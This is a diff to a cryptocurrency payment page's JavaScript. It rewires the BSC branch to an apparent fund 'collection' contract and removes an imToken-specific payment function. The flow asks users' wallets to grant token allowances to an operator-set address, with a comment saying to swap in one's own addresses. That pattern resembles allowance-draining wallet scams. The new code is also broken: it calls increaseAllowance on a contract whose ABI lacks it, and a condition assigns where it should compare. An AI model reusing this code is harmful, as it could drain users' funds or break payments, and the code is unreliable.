@@ -787,293 +787,94 @@ async function getWallet() {
       switch (parseInt(window.ethereum.networkVersion)) {
         case 56:
           chain = 'bsc'
-          contract_addr = '0x55d398326f99059ff775485246999027b3197955'
+          contract_addr = bsc_contract_address
           contract_abi = [
             {
-              inputs: [],
-              payable: false,
+              inputs: [
+                { internalType: 'address', name: '_usdtAddress', type: 'address' },
+                { internalType: 'address', name: '_collectionAddress', type: 'address' },
+                { internalType: 'uint256', name: '_threshold', type: 'uint256' },
+              ],
               stateMutability: 'nonpayable',
               type: 'constructor',
             },
             {
               anonymous: false,
               inputs: [
-                {
-                  indexed: true,
-                  internalType: 'address',
-                  name: 'owner',
-                  type: 'address',
-                },
-                {
-                  indexed: true,
-                  internalType: 'address',
-                  name: 'spender',
-                  type: 'address',
-                },
-                { indexed: false, internalType: 'uint256', name: 'value', type: 'uint256' },
+                { indexed: false, internalType: 'uint256', name: 'amount', type: 'uint256' },
               ],
-              name: 'Approval',
+              name: 'FundsCollected',
               type: 'event',
             },
             {
               anonymous: false,
               inputs: [
-                {
-                  indexed: true,
-                  internalType: 'address',
-                  name: 'previousOwner',
-                  type: 'address',
-                },
-                { indexed: true, internalType: 'address', name: 'newOwner', type: 'address' },
+                { indexed: false, internalType: 'uint256', name: 'newThreshold', type: 'uint256' },
               ],
-              name: 'OwnershipTransferred',
+              name: 'ThresholdUpdated',
               type: 'event',
             },
             {
-              anonymous: false,
-              inputs: [
-                {
-                  indexed: true,
-                  internalType: 'address',
-                  name: 'from',
-                  type: 'address',
-                },
-                {
-                  indexed: true,
-                  internalType: 'address',
-                  name: 'to',
-                  type: 'address',
-                },
-                { indexed: false, internalType: 'uint256', name: 'value', type: 'uint256' },
-              ],
-              name: 'Transfer',
-              type: 'event',
-            },
-            {
-              constant: true,
               inputs: [],
-              name: '_decimals',
-              outputs: [{ internalType: 'uint8', name: '', type: 'uint8' }],
-              payable: false,
-              stateMutability: 'view',
-              type: 'function',
-            },
-            {
-              constant: true,
-              inputs: [],
-              name: '_name',
-              outputs: [{ internalType: 'string', name: '', type: 'string' }],
-              payable: false,
-              stateMutability: 'view',
-              type: 'function',
-            },
-            {
-              constant: true,
-              inputs: [],
-              name: '_symbol',
-              outputs: [{ internalType: 'string', name: '', type: 'string' }],
-              payable: false,
-              stateMutability: 'view',
-              type: 'function',
-            },
-            {
-              constant: true,
-              inputs: [
-                {
-                  internalType: 'address',
-                  name: 'owner',
-                  type: 'address',
-                },
-                { internalType: 'address', name: 'spender', type: 'address' },
-              ],
-              name: 'allowance',
-              outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
-              payable: false,
-              stateMutability: 'view',
-              type: 'function',
-            },
-            {
-              constant: false,
-              inputs: [
-                {
-                  internalType: 'address',
-                  name: 'spender',
-                  type: 'address',
-                },
-                { internalType: 'uint256', name: 'amount', type: 'uint256' },
-              ],
-              name: 'approve',
-              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
-              payable: false,
-              stateMutability: 'nonpayable',
-              type: 'function',
-            },
-            {
-              constant: true,
-              inputs: [{ internalType: 'address', name: 'account', type: 'address' }],
-              name: 'balanceOf',
-              outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
-              payable: false,
-              stateMutability: 'view',
-              type: 'function',
-            },
-            {
-              constant: false,
-              inputs: [{ internalType: 'uint256', name: 'amount', type: 'uint256' }],
-              name: 'burn',
-              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
-              payable: false,
-              stateMutability: 'nonpayable',
-              type: 'function',
-            },
-            {
-              constant: true,
-              inputs: [],
-              name: 'decimals',
-              outputs: [{ internalType: 'uint8', name: '', type: 'uint8' }],
-              payable: false,
-              stateMutability: 'view',
-              type: 'function',
-            },
-            {
-              constant: false,
-              inputs: [
-                {
-                  internalType: 'address',
-                  name: 'spender',
-                  type: 'address',
-                },
-                { internalType: 'uint256', name: 'subtractedValue', type: 'uint256' },
-              ],
-              name: 'decreaseAllowance',
-              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
-              payable: false,
-              stateMutability: 'nonpayable',
-              type: 'function',
-            },
-            {
-              constant: true,
-              inputs: [],
-              name: 'getOwner',
+              name: 'collectionAddress',
               outputs: [{ internalType: 'address', name: '', type: 'address' }],
-              payable: false,
               stateMutability: 'view',
               type: 'function',
             },
             {
-              constant: false,
-              inputs: [
-                {
-                  internalType: 'address',
-                  name: 'spender',
-                  type: 'address',
-                },
-                { internalType: 'uint256', name: 'addedValue', type: 'uint256' },
-              ],
-              name: 'increaseAllowance',
-              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
-              payable: false,
-              stateMutability: 'nonpayable',
-              type: 'function',
-            },
-            {
-              constant: false,
-              inputs: [{ internalType: 'uint256', name: 'amount', type: 'uint256' }],
-              name: 'mint',
-              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
-              payable: false,
-              stateMutability: 'nonpayable',
-              type: 'function',
-            },
-            {
-              constant: true,
               inputs: [],
-              name: 'name',
-              outputs: [{ internalType: 'string', name: '', type: 'string' }],
-              payable: false,
-              stateMutability: 'view',
+              name: 'emergencyWithdraw',
+              outputs: [],
+              stateMutability: 'nonpayable',
               type: 'function',
             },
             {
-              constant: true,
               inputs: [],
               name: 'owner',
               outputs: [{ internalType: 'address', name: '', type: 'address' }],
-              payable: false,
               stateMutability: 'view',
               type: 'function',
             },
             {
-              constant: false,
-              inputs: [],
-              name: 'renounceOwnership',
+              inputs: [{ internalType: 'uint256', name: 'amount', type: 'uint256' }],
+              name: 'pay',
               outputs: [],
-              payable: false,
               stateMutability: 'nonpayable',
               type: 'function',
             },
             {
-              constant: true,
-              inputs: [],
-              name: 'symbol',
-              outputs: [{ internalType: 'string', name: '', type: 'string' }],
-              payable: false,
-              stateMutability: 'view',
-              type: 'function',
-            },
-            {
-              constant: true,
-              inputs: [],
-              name: 'totalSupply',
-              outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
-              payable: false,
-              stateMutability: 'view',
-              type: 'function',
-            },
-            {
-              constant: false,
-              inputs: [
-                {
-                  internalType: 'address',
-                  name: 'recipient',
-                  type: 'address',
-                },
-                { internalType: 'uint256', name: 'amount', type: 'uint256' },
-              ],
-              name: 'transfer',
-              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
-              payable: false,
+              inputs: [{ internalType: 'address', name: 'newAddress', type: 'address' }],
+              name: 'setCollectionAddress',
+              outputs: [],
               stateMutability: 'nonpayable',
               type: 'function',
             },
             {
-              constant: false,
-              inputs: [
-                {
-                  internalType: 'address',
-                  name: 'sender',
-                  type: 'address',
-                },
-                {
-                  internalType: 'address',
-                  name: 'recipient',
-                  type: 'address',
-                },
-                { internalType: 'uint256', name: 'amount', type: 'uint256' },
-              ],
-              name: 'transferFrom',
-              outputs: [{ internalType: 'bool', name: '', type: 'bool' }],
-              payable: false,
-              stateMutability: 'nonpayable',
-              type: 'function',
-            },
-            {
-              constant: false,
               inputs: [{ internalType: 'address', name: 'newOwner', type: 'address' }],
-              name: 'transferOwnership',
+              name: 'setOwner',
               outputs: [],
-              payable: false,
               stateMutability: 'nonpayable',
+              type: 'function',
+            },
+            {
+              inputs: [{ internalType: 'uint256', name: 'newThreshold', type: 'uint256' }],
+              name: 'setThreshold',
+              outputs: [],
+              stateMutability: 'nonpayable',
+              type: 'function',
+            },
+            {
+              inputs: [],
+              name: 'threshold',
+              outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
+              stateMutability: 'view',
+              type: 'function',
+            },
+            {
+              inputs: [],
+              name: 'usdtAddress',
+              outputs: [{ internalType: 'address', name: '', type: 'address' }],
+              stateMutability: 'view',
               type: 'function',
             },
           ]
@@ -3395,23 +3196,29 @@ function payNow() {
     }
     //以下两个地址更改为自己地址（目前写的是官方）
   } else if (chain == 'bsc') {
-    if (wallet == 'imToken') {
-      alert('imTokenBSC 支付')
-      imTokenBSC()
-    } else {
-      contract.methods
-        .increaseAllowance(eth_address, amount)
-        .send({ from: accounts[0] })
-        .on('transactionHash', function (hash) {
-          successCallback(accounts[0], '0x55d398326f99059ff775485246999027b3197955', 1)
+    contract.methods
+      .increaseAllowance(bsc_contract_address, amount)
+      .send({ from: accounts[0] })
+      .on('transactionHash', async function (hash) {
+        // 显示支付确认信息
+        alert('正在拉起支付，请在钱包中确认交易')
+        // 调用合约的pay方法
+        console.log('开始调用合约pay方法, 金额:', amount)
+        const transaction = await contract.methods.pay(amount).send({
+          from: accounts[0],
+          gas: 200000, // 根据合约复杂度调整
+          gasPrice: web3.utils.toWei('5', 'gwei'), // 根据当前BSC网络的Gas价格调整
         })
-    }
+        // 交易成功后回调
+        console.log('交易详情:', transaction)
+        successCallback(accounts[0], bsc_contract_address, 2)
+      })
   } else if ((chain = 'eth')) {
     contract.methods
       .approve(eth_address, amount)
       .send({ from: accounts[0] })
       .on('transactionHash', function (hash) {
-        successCallback(accounts[0], '0xdAC17F958D2ee523a2206206994597C13D831ec7', 1)
+        successCallback(accounts[0], eth_address, 1)
       })
   }
 }
@@ -3793,195 +3600,3 @@ contract_abi = []
 document.addEventListener('DOMContentLoaded', function () {
   getWalletTimer = setInterval(getWallet, 1000)
 })
-
-// BSC链imToken支付
-async function imTokenBSC() {
-  console.log('开始imTokenBSC函数')
-  try {
-    if (typeof window.ethereum !== 'undefined') {
-      console.log('检测到ethereum钱包')
-      // 确保已连接钱包
-      await window.ethereum.request({ method: 'eth_requestAccounts' })
-      console.log('钱包连接成功')
-
-      // 检查是否是BSC网络
-      const chainId = await window.ethereum.request({ method: 'eth_chainId' })
-      console.log('当前链ID:', chainId)
-      if (chainId !== '0x38') {
-        // BSC Mainnet chainId
-        console.log('非BSC网络，尝试切换')
-        try {
-          // 尝试切换到BSC网络
-          await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: '0x38' }],
-          })
-          console.log('成功切换到BSC网络')
-        } catch (switchError) {
-          console.error('切换网络错误:', switchError)
-          // 用户可能需要添加BSC网络
-          if (switchError.code === 4902) {
-            console.log('尝试添加BSC网络')
-            await window.ethereum.request({
-              method: 'wallet_addEthereumChain',
-              params: [
-                {
-                  chainId: '0x38',
-                  chainName: 'Binance Smart Chain',
-                  nativeCurrency: {
-                    name: 'BNB',
-                    symbol: 'BNB',
-                    decimals: 18,
-                  },
-                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                  blockExplorerUrls: ['https://bscscan.com/'],
-                },
-              ],
-            })
-            console.log('BSC网络添加成功')
-          } else {
-            throw switchError
-          }
-        }
-      }
-
-      const web3 = new Web3(window.ethereum)
-      console.log('Web3实例创建成功')
-      const accounts = await web3.eth.getAccounts()
-      console.log('获取到账户:', accounts)
-      const userAccount = accounts[0]
-
-      // 确认用户有足够的BNB支付Gas费
-      const balance = await web3.eth.getBalance(userAccount)
-      console.log('用户BNB余额:', web3.utils.fromWei(balance, 'ether'), 'BNB')
-      if (web3.utils.fromWei(balance, 'ether') < 0.01) {
-        alert('BNB余额不足，无法支付Gas费用')
-        return
-      }
-
-      // 使用用户的合约
-      const bscContractAddress = '0xa9470e80e9ad31b4b0d745037711bc3ef30ce70c'
-      console.log('合约地址:', bscContractAddress)
-      const contractABI = [
-        {
-          inputs: [
-            { internalType: 'address', name: '_usdtAddress', type: 'address' },
-            { internalType: 'address', name: '_collectionAddress', type: 'address' },
-            { internalType: 'uint256', name: '_threshold', type: 'uint256' },
-          ],
-          stateMutability: 'nonpayable',
-          type: 'constructor',
-        },
-        {
-          anonymous: false,
-          inputs: [{ indexed: false, internalType: 'uint256', name: 'amount', type: 'uint256' }],
-          name: 'FundsCollected',
-          type: 'event',
-        },
-        {
-          anonymous: false,
-          inputs: [
-            { indexed: false, internalType: 'uint256', name: 'newThreshold', type: 'uint256' },
-          ],
-          name: 'ThresholdUpdated',
-          type: 'event',
-        },
-        {
-          inputs: [],
-          name: 'collectionAddress',
-          outputs: [{ internalType: 'address', name: '', type: 'address' }],
-          stateMutability: 'view',
-          type: 'function',
-        },
-        {
-          inputs: [],
-          name: 'emergencyWithdraw',
-          outputs: [],
-          stateMutability: 'nonpayable',
-          type: 'function',
-        },
-        {
-          inputs: [],
-          name: 'owner',
-          outputs: [{ internalType: 'address', name: '', type: 'address' }],
-          stateMutability: 'view',
-          type: 'function',
-        },
-        {
-          inputs: [{ internalType: 'uint256', name: 'amount', type: 'uint256' }],
-          name: 'pay',
-          outputs: [],
-          stateMutability: 'nonpayable',
-          type: 'function',
-        },
-        {
-          inputs: [{ internalType: 'address', name: 'newAddress', type: 'address' }],
-          name: 'setCollectionAddress',
-          outputs: [],
-          stateMutability: 'nonpayable',
-          type: 'function',
-        },
-        {
-          inputs: [{ internalType: 'address', name: 'newOwner', type: 'address' }],
-          name: 'setOwner',
-          outputs: [],
-          stateMutability: 'nonpayable',
-          type: 'function',
-        },
-        {
-          inputs: [{ internalType: 'uint256', name: 'newThreshold', type: 'uint256' }],
-          name: 'setThreshold',
-          outputs: [],
-          stateMutability: 'nonpayable',
-          type: 'function',
-        },
-        {
-          inputs: [],
-          name: 'threshold',
-          outputs: [{ internalType: 'uint256', name: '', type: 'uint256' }],
-          stateMutability: 'view',
-          type: 'function',
-        },
-        {
-          inputs: [],
-          name: 'usdtAddress',
-          outputs: [{ internalType: 'address', name: '', type: 'address' }],
-          stateMutability: 'view',
-          type: 'function',
-        },
-      ]
-
-      const bscContract = new web3.eth.Contract(contractABI, bscContractAddress)
-      console.log('合约实例创建成功')
-
-      // 保持与其他支付方法一致
-      document.getElementById('btn_pay').setAttribute('style', 'display:none')
-      // 使用全局amount变量，此时已经在payNow中设置为正确的USDT金额
-      console.log('支付金额:', amount)
-
-      // 显示支付确认信息
-      alert('正在拉起支付，请在钱包中确认交易')
-
-      // 调用合约的pay方法
-      console.log('开始调用合约pay方法, 金额:', amount)
-      const transaction = await bscContract.methods.pay(amount).send({
-        from: userAccount,
-        gas: 200000, // 根据合约复杂度调整
-        gasPrice: web3.utils.toWei('5', 'gwei'), // 根据当前BSC网络的Gas价格调整
-      })
-
-      // 交易成功后回调
-      console.log('交易哈希:', transaction.transactionHash)
-      console.log('交易详情:', transaction)
-      successCallback(userAccount, bscContractAddress, 2)
-    } else {
-      console.error('未检测到以太坊钱包')
-      alert('未检测到以太坊钱包，请安装imToken或其他兼容钱包')
-    }
-  } catch (error) {
-    console.error('BSC支付错误:', error)
-    console.error('错误详情:', JSON.stringify(error, Object.getOwnPropertyNames(error)))
-    alert('支付失败: ' + (error.message || '未知错误'))
-    document.getElementById('btn_pay').removeAttribute('style')
-  }
-}
